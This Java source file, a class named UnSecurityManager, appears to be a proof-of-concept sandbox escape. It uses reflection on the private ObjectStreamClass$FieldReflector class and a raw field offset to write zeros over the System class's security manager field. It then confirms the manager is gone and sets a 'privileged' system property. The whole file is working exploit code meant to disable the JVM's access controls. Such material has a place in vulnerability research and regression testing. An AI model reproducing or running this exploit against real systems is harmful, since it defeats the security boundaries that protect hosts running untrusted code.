package acc04j;

import java.lang.reflect.*;
import java.io.*;

class UnSecurityManager {

  public static void main(String[] argv) {
    try {
      SecurityManager sm = System.getSecurityManager();
      if (sm != null) {
        System.out.println("Security manager installed.");
      } else {
        System.out.println("No security manager.");
      }

      try {
        System.setProperty("acc04j.options", "privileged");
      } catch (java.security.AccessControlException ace) {
        System.out.println(ace.getMessage());
      }

      // Creates an ObjectStreamField representing a serializable field with the named s with type long.
      ObjectStreamField osf = new ObjectStreamField("s", long.class);
      ObjectStreamField[] osfArray = new ObjectStreamField[]{osf};

      // FieldReflector is a private static class for setting and retrieving serializable field values
      Class<?> FieldReflector = Class.forName("java.io.ObjectStreamClass$FieldReflector");
      Constructor<?> FieldReflector_ctor = FieldReflector.getDeclaredConstructors()[0];
      FieldReflector_ctor.setAccessible(true);
      Object fr = FieldReflector_ctor.newInstance(new Object[] { osfArray });
      System.out.println(fr);

      // FieldReflector.writeKeys is the unsafe fields keys for writing fields
      Field writeKeys_field = fr.getClass().getDeclaredField("writeKeys");
      writeKeys_field.setAccessible(true);
      writeKeys_field.set(fr, new long[] { 116 });

      // The setPrimFieldValues method sets the serializable primitive fields of an object using values
      // unmarshalled from a byte array starting at offset 0.
      Method setPrimFieldValues = fr.getClass().getDeclaredMethod("setPrimFieldValues", Object.class, byte[].class);
      setPrimFieldValues.setAccessible(true);
      
      System.out.println(System.getSecurityManager());

      // Overwrite the security manager for the system with null (zeros).
      byte[] zeros = new byte[8];
      setPrimFieldValues.invoke(fr, System.class, zeros);

      sm = System.getSecurityManager();
      if (sm != null) {
        System.out.println("Security manager installed.");
      } else {
        System.out.println("No security manager.");
      }

      System.setProperty("acc04j.options", "privileged");
    } catch (IllegalAccessException | IllegalArgumentException | InvocationTargetException | NoSuchMethodException
        | SecurityException | NoSuchFieldException | InstantiationException | ClassNotFoundException e) {
      e.printStackTrace();
    }
  } // end main()

} // end class UnSecuritymanager
